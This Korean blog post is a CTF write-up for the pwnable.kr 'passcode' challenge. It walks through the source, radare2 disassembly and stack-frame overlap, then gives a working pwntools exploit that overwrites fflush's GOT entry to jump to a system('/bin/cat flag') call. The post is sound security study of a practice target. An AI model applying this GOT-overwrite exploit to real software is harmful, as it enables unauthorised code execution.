---
title: "[pwnable.kr] passcode"
published: 2026-09-25
description: 워게임 풀기
category: CTF
tags: [pwnable.kr, study]
draft: false
---

# 스택 프레임
사실 이 안에서 약간 다른 부분을 알아야 하는 느낌인 것 같다.  
그래도 스택 프레임의 이해도와 관련 있다고 생각한다. `스택 프레임`을 굵게 표시한 것도 그런 이유다.  

# 풀이
## 핵심
문제는 간단하다.  
`프레임 위치`, `덮어쓸 값`, `덮어쓸 주소`, `코드 조각 재사용`.  
이 네 가지가 중요 키워드였던 것 같다.  

`Radare2`를 써본 적이 거의 없어서, 이젠 이 디버거를 주력으로 사용하려 한다.  
가장 나은 것 같다. 전엔 어려워서 안 썼다.  

보호 기법 및 간단한 정보는 다음과 같다:  
```bash
[*] '***/passcode'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

## 코드 분석
코드를 둘러보자  

### 1. `main()`
```c
int main(){
    ...
    welcome();
    login();
    ...
}
```

`main`에서 호출되는 함수는 두 가지이다. 모두 `main()`에서 호출된다는 점이 중요하다.  
어셈블리로 해당 부분만 보면 다음과 같다:  

```asm
...
│           0x0804938d      83c410         add esp, 0x10
│           0x08049390      e85dffffff     call sym.welcome
│           0x08049395      e85cfeffff     call sym.login
...
```

딱히 중간에 `esp`가 변하지도 않는다.

### 2. `welcome()`
```c
void welcome(){
    char name[100];
    printf("enter you name : ");
    scanf("%100s", name);
    printf("Welcome %s!\n", name);
}
```
그냥 100글자 입력이다. `%s`라 `raw bytes`들을 넣을 수도 있다. 그냥 뭐 그렇단 얘기,,  

### 3. `login()`
```c
void login(){
    int passcode1;
    int passcode2;
    
    printf("enter passcode1 : ");
    scanf("%d", passcode1);
    fflush(stdin);
    
    // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
    printf("enter passcode2 : ");
    scanf("%d", passcode2);
    
    printf("checking...\n");
    if(passcode1==338150 && passcode2==13371337){
            printf("Login OK!\n");
            setregid(getegid(), getegid());
            system("/bin/cat flag");
    }
    else{
            printf("Login Failed!\n");
            exit(0);
    }
}
```
이번 코드도 핵심만 보여주면 된다. 그러나 함수의 전체 코드는 당황을 느껴보게 하기 위해 넣었다.  
간단하게, &(앰퍼샌드)를 붙이지 않은 점, 그리고 아무 일도 없었다는 듯 `if`문으로 그럴 듯한 분기문이 적혀 있다는 점..  
당황스러웠다. 공포감을 느꼈다. 
# 이게 뭐지? 
의도하지 않고서야 이런 이상함을 낼 수는 없다고 느꼈고, 오랜만에 재밌는 생각들을 했다.  

## 계획
먼저, `main()`에서 호출되는 두 함수 `welcome`과 `login`을 보자.  
두 함수는 호출 될 때 사이에서 `esp` 조정이 발생하지 않았고, 프롤로그도 똑같다. 딱히 조정되는 것이 없다.  
무엇보다도 이건 상식이다. 함수에서 사용하는 변수의 오프셋(지역 변수의 오프셋)이 모두 같은 `ebp`를 사용한다.  

아래는 간단한 어셈블리다. 잠시 둘러보길 권한다. 중요한 부분은 `오프셋`, 각 `scanf`가 필요로 하는 지역 변수의 오프셋이다.  
그리고 `system` 호출이 있는데, 여기엔 인자 넣는 부분 조각도 있기 때문에 써먹을 수 있다. `NO PIE`인 상태이니까.  
```asm
0x080490e0]> pdf @ sym.welcome
            ; CALL XREF from main @ 0x8049390
┌ 114: sym.welcome ();
│           ; var int32_t var_70h @ ebp-0x70
│           ; var int32_t var_ch @ ebp-0xc
│           ; var int32_t var_4h @ ebp-0x4
│           0x080492f2      55             push ebp
│           0x080492f3      89e5           mov ebp, esp
│           0x080492f5      53             push ebx
│           0x080492f6      83ec74         sub esp, 0x74
│           0x080492f9      e832feffff     call sym.__x86.get_pc_thunk.bx
│           0x080492fe      81c3022d0000   add ebx, 0x2d02
│           0x08049304      65a114000000   mov eax, dword gs:[0x14]
│           0x0804930a      8945f4         mov dword [var_ch], eax
│           0x0804930d      31c0           xor eax, eax
│           0x0804930f      83ec0c         sub esp, 0xc
│           0x08049312      8d8363e0ffff   lea eax, [ebx - 0x1f9d]
│           0x08049318      50             push eax                    ; const char *format
│           0x08049319      e832fdffff     call sym.imp.printf         ; int printf(const char *format)
│           0x0804931e      83c410         add esp, 0x10
│           0x08049321      83ec08         sub esp, 8
│           0x08049324      8d4590         lea eax, [var_70h]
│           0x08049327      50             push eax
│           0x08049328      8d8375e0ffff   lea eax, [ebx - 0x1f8b]
│           0x0804932e      50             push eax                    ; const char *format
│           0x0804932f      e89cfdffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x08049334      83c410         add esp, 0x10
│           0x08049337      83ec08         sub esp, 8
│           0x0804933a      8d4590         lea eax, [var_70h]
│           0x0804933d      50             push eax
│           0x0804933e      8d837be0ffff   lea eax, [ebx - 0x1f85]
│           0x08049344      50             push eax                    ; const char *format
│           0x08049345      e806fdffff     call sym.imp.printf         ; int printf(const char *format)
│           0x0804934a      83c410         add esp, 0x10
│           0x0804934d      90             nop
│           0x0804934e      8b45f4         mov eax, dword [var_ch]
│           0x08049351      652b05140000.  sub eax, dword gs:[0x14]
│       ┌─< 0x08049358      7405           je 0x804935f
│       │   0x0804935a      e861000000     call sym.__stack_chk_fail_local
│       │   ; CODE XREF from sym.welcome @ 0x8049358
│       └─> 0x0804935f      8b5dfc         mov ebx, dword [var_4h]
│           0x08049362      c9             leave
└           0x08049363      c3             ret
[0x080490e0]> pdf @ sym.login
            ; CALL XREF from main @ 0x8049395
┌ 252: sym.login ();
│           ; var uint32_t var_10h @ ebp-0x10
│           ; var uint32_t var_ch @ ebp-0xc
│           ; var int32_t var_8h @ ebp-0x8
│           0x080491f6      55             push ebp
│           0x080491f7      89e5           mov ebp, esp
│           0x080491f9      56             push esi
│           0x080491fa      53             push ebx
│           0x080491fb      83ec10         sub esp, 0x10
│           0x080491fe      e82dffffff     call sym.__x86.get_pc_thunk.bx
│           0x08049203      81c3fd2d0000   add ebx, 0x2dfd
│           0x08049209      83ec0c         sub esp, 0xc
│           0x0804920c      8d8308e0ffff   lea eax, [ebx - 0x1ff8]
│           0x08049212      50             push eax                    ; const char *format
│           0x08049213      e838feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x08049218      83c410         add esp, 0x10
│           0x0804921b      83ec08         sub esp, 8
│           0x0804921e      ff75f0         push dword [var_10h]
│           0x08049221      8d831be0ffff   lea eax, [ebx - 0x1fe5]
│           0x08049227      50             push eax                    ; const char *format
│           0x08049228      e8a3feffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x0804922d      83c410         add esp, 0x10
│           0x08049230      8b83fcffffff   mov eax, dword [ebx - 4]
│           0x08049236      8b00           mov eax, dword [eax]
│           0x08049238      83ec0c         sub esp, 0xc
│           0x0804923b      50             push eax                    ; FILE *stream
│           0x0804923c      e81ffeffff     call sym.imp.fflush         ; int fflush(FILE *stream)
│           0x08049241      83c410         add esp, 0x10
│           0x08049244      83ec0c         sub esp, 0xc
│           0x08049247      8d831ee0ffff   lea eax, [ebx - 0x1fe2]
│           0x0804924d      50             push eax                    ; const char *format
│           0x0804924e      e8fdfdffff     call sym.imp.printf         ; int printf(const char *format)
│           0x08049253      83c410         add esp, 0x10
│           0x08049256      83ec08         sub esp, 8
│           0x08049259      ff75f4         push dword [var_ch]
│           0x0804925c      8d831be0ffff   lea eax, [ebx - 0x1fe5]
│           0x08049262      50             push eax                    ; const char *format
│           0x08049263      e868feffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x08049268      83c410         add esp, 0x10
│           0x0804926b      83ec0c         sub esp, 0xc
│           0x0804926e      8d8331e0ffff   lea eax, [ebx - 0x1fcf]
│           0x08049274      50             push eax                    ; const char *s
│           0x08049275      e816feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0804927a      83c410         add esp, 0x10
│           0x0804927d      817df0e62805.  cmp dword [var_10h], 0x528e6
│       ┌─< 0x08049284      7548           jne 0x80492ce
│       │   0x08049286      817df4c907cc.  cmp dword [var_ch], 0xcc07c9
│      ┌──< 0x0804928d      753f           jne 0x80492ce
│      ││   0x0804928f      83ec0c         sub esp, 0xc
│      ││   0x08049292      8d833de0ffff   lea eax, [ebx - 0x1fc3]
│      ││   0x08049298      50             push eax                    ; const char *s
│      ││   0x08049299      e8f2fdffff     call sym.imp.puts           ; int puts(const char *s)
│      ││   0x0804929e      83c410         add esp, 0x10
│      ││   0x080492a1      e8dafdffff     call sym.imp.getegid
│      ││   0x080492a6      89c6           mov esi, eax
│      ││   0x080492a8      e8d3fdffff     call sym.imp.getegid
│      ││   0x080492ad      83ec08         sub esp, 8
│      ││   0x080492b0      56             push esi
│      ││   0x080492b1      50             push eax
│      ││   0x080492b2      e809feffff     call sym.imp.setregid
│      ││   0x080492b7      83c410         add esp, 0x10
│      ││   0x080492ba      83ec0c         sub esp, 0xc
│      ││   0x080492bd      8d8347e0ffff   lea eax, [ebx - 0x1fb9]
│      ││   0x080492c3      50             push eax                    ; const char *string
│      ││   0x080492c4      e8d7fdffff     call sym.imp.system         ; int system(const char *string)
│      ││   0x080492c9      83c410         add esp, 0x10
│     ┌───< 0x080492cc      eb1c           jmp 0x80492ea
│     │││   ; CODE XREFS from sym.login @ 0x8049284, 0x804928d
│     │└└─> 0x080492ce      83ec0c         sub esp, 0xc
│     │     0x080492d1      8d8355e0ffff   lea eax, [ebx - 0x1fab]
│     │     0x080492d7      50             push eax                    ; const char *s
│     │     0x080492d8      e8b3fdffff     call sym.imp.puts           ; int puts(const char *s)
│     │     0x080492dd      83c410         add esp, 0x10
│     │     0x080492e0      83ec0c         sub esp, 0xc
│     │     0x080492e3      6a00           push 0
│     │     0x080492e5      e8c6fdffff     call sym.imp.exit
│     │     ; CODE XREF from sym.login @ 0x80492cc
│     └───> 0x080492ea      90             nop
│           0x080492eb      8d65f8         lea esp, [var_8h]
│           0x080492ee      5b             pop ebx
│           0x080492ef      5e             pop esi
│           0x080492f0      5d             pop ebp
└           0x080492f1      c3             ret
[0x080490e0]> 
```

바이너리 어딘가에 있는 `system` 호출 조각,  
주소에 직접 쓰는 취약점,  
그리고 거의 같은 위치에 놓이게 될 프레임을 고려하지 않은 100글자 입력 설계,  
`No PIE`,  
그리고 갑자기 입력 사이에 애매하게 등장하는 `fflush()`  

이 다섯 가지 정보를 종합하면 어느 정도 쉽게  
`fflush()`를 덮어 `system` 호출 조각을 가리키게 하고 `flag` 파일을 읽는 부분만 실행되게 하면 성공이다..  
라는 점을 알 수 있었다.  

적절히 수행하려면, 나의 경우, `passcode1`이 이미 **어떤 주소**( 여기서는 `fflush()의 GOT` )를 가리키고 있으며, 100글자 이내의 거리에  
`welcome()`의 `name`과 `login()`의 `passcode1`이 덮을 수 있게 있기만 하면 된다.  

`name`에서 시작하여 `passcode1`을 덮고, 그 뒤, `passcode1`에 입력을 받는 시점에,  
`system` 호출 조각을 덮어 `flag` 파일을 읽는 부분만 실행되게 하면 된다. 로 정리가 가능한 것 같다.  

## 익스
```py
cat ex.py 
from pwn import *

context.binary = elf = ELF('./passcode')
context.log_level = "debug"

#p = process()
p = remote("pwnable.kr", 10004)

def slog(n, a): return success(': '.join([n, hex(a)]))

fflush_got = elf.got["fflush"]
slog("fflush_GOT", fflush_got)
system = 0x080492bd
slog("in-binary system gadget", system)

pay = b'A'*(0x70-0x10) + p32(fflush_got)
p.sendline(pay)
pause()
p.sendline(str(system).encode())

p.interactive()
```
생각해보니 `slog()`는 어느 드림핵 강의에서 보고 꾸준히 쓰는 것 같다.  
이상하게 당시 이해가 되고 이 함수를 잊고 싶지 않다는 생각에 기억에 남기기로 했다.  

# 번외
```bash
[0x080490e0]> iz
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00002008 0x0804a008 18  19   .rodata ascii enter passcode1 : 
1   0x0000201e 0x0804a01e 18  19   .rodata ascii enter passcode2 : 
2   0x00002031 0x0804a031 11  12   .rodata ascii checking...
3   0x0000203d 0x0804a03d 9   10   .rodata ascii Login OK!
4   0x00002047 0x0804a047 13  14   .rodata ascii /bin/cat flag
5   0x00002055 0x0804a055 13  14   .rodata ascii Login Failed!
6   0x00002063 0x0804a063 17  18   .rodata ascii enter you name : 
7   0x00002075 0x0804a075 5   6    .rodata ascii %100s
8   0x0000207b 0x0804a07b 12  13   .rodata ascii Welcome %s!\n
9   0x00002088 0x0804a088 39  40   .rodata ascii Toddler's Secure Login System 1.1 beta.
10  0x000020b0 0x0804a0b0 54  55   .rodata ascii Now I can safely trust you that you have credential :)

[0x080490e0]> ii
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x08049040 GLOBAL FUNC       __libc_start_main
2   0x08049050 GLOBAL FUNC       printf
3   0x08049060 GLOBAL FUNC       fflush
4   0x08049070 GLOBAL FUNC       __stack_chk_fail
5   0x08049080 GLOBAL FUNC       getegid
6   0x08049090 GLOBAL FUNC       puts
7   0x080490a0 GLOBAL FUNC       system
8   0x00000000 WEAK   NOTYPE     __gmon_start__
9   0x080490b0 GLOBAL FUNC       exit
10  0x00000000 GLOBAL OBJ        stdin
11  0x080490c0 GLOBAL FUNC       setregid
12  0x080490d0 GLOBAL FUNC       __isoc99_scanf
```

그리고 `r2`에선 이렇게 손쉽게 `GOT table`과 `strings` 목록을 확인 가능하다!! 개신기함.  
ㄷㄷ
